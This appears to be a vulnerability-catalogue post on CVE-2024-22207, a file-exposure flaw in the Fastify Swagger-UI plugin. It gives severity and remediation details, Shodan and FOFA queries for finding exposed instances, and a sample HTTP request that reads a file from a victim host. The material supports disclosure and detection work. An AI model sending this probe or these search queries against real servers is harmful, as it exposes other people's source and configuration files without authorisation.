---
layout: post
cve_id: CVE-2024-22207
title: Fastify Swagger-UI - Information Disclosure
pcap: true
pcap_path: /pcaps/2024/CVE-2024-22207.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-22207.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK,iamnoooob
severity: medium
impact: 'Unauthenticated attackers can access sensitive files in the Fastify Swagger-UI
  module directory, potentially exposing source code or configuration files.

  '
remediation: 'Update @fastify/swagger-ui to version 2.1.0 or later, or configure the
  baseDir option.

  '
reference:
- https://security.netapp.com/advisory/ntap-20240216-0002/
- https://nvd.nist.gov/vuln/detail/CVE-2024-22207
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
  cvss-score: 5.3
  cve-id: CVE-2024-22207
  cwe-id: CWE-1188
  epss-score: 0.16258
  epss-percentile: 0.94605
  cpe: cpe:2.3:a:smartbear:swagger_ui:*:*:*:*:*:node.js:*:*
metadata:
  vendor: smartbear
  product: swagger_ui
  framework: node.js
  shodan-query:
  - http.component:"swagger"
  - http.favicon.hash:"-1180440057"
  fofa-query: icon_hash="-1180440057"
tags:
- cve
- cve2024
- swagger-ui
- exposure
- vuln
---

## üîç Vulnerability Description
fastify-swagger-ui is a Fastify plugin for serving Swagger UI.  Prior to 2.1.0, the default configuration of `@fastify/swagger-ui` without `baseDir` set will lead to all files in the module's directory being exposed via http routes served by the module.  The vulnerability is fixed in v2.1.0. Setting the `baseDir` option can also work around this vulnerability.


## üåê HTTP Request
```nohighlight
GET /documentation/playwright.config.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

